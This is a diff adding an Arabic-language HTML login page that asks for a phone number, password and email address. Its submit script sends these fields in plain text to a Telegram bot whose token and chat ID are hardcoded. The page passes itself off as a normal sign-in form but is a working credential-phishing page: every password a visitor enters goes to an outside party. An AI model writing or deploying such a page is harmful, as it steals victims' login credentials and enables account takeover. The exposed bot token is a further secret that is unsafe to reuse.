@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نموذج تسجيل الدخول</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        label { display: block; margin: 10px 0 5px; }
+        input { width: 100%; padding: 10px; margin-bottom: 10px; }
+        button { padding: 10px; background-color: #007BFF; color: white; border: none; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <h1>تسجيل الدخول</h1>
+    <form id="loginForm">
+        <label for="phone">رقم الهاتف:</label>
+        <input type="text" id="phone" name="phone" required>
+        
+        <label for="password">كلمة المرور:</label>
+        <input type="password" id="password" name="password" required>
+        
+        <label for="email">البريد الإلكتروني:</label>
+        <input type="email" id="email" name="email" required>
+        
+        <button type="submit">تسجيل الدخول</button>
+    </form>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const formData = new FormData(this);
+            const phone = formData.get('phone');
+            const password = formData.get('password');
+            const email = formData.get('email');
+
+            // نص الرسالة التي سترسل إلى بوت تليجرام
+            const message = `تسجيل دخول جديد:\nرقم الهاتف: ${phone}\nكلمة المرور: ${password}\nالبريد الإلكتروني: ${email}`;
+            
+            // إرسال البيانات إلى بوت تليجرام
+            fetch(`https://api.telegram.org/bot7253203500:AAF01du1B24-oZDVmMM4GlGKhMYQ_-tT2XM/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: '6389250998',
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => console.log(data))
+            .catch(error => console.error('Error:', error));
+        });
+    </script>
+
+</body>
+</html>
